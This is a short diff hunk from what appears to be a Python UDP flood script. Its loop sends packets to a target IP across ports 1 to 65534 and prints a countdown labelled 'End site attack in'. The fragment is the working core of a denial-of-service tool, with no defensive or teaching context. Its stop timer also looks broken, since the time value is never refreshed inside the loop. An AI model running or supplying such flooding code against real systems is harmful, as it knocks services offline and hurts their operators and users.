@@ -61,12 +61,16 @@ nowminute = 0
 ##nowminute = now.minute*1
 ##print('time %s:%s'%(nowhour,nowminute))
 ##print "sent packet: s% to %s on port:%s"%(sent,ip,port)
+
 while True:
+            nowminute = now.minute*1
+            print('End site attack in: %s:%s'%(hour,stopminute))
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
-            nowminute = now.minute*1
+            print(nowminute)
             if port == 65534:
                         port = 1
-                        if nowminute == stopminute:
-                                    sys.exit()
+                        
+            if nowminute == stopminute:
+                        sys.exit()
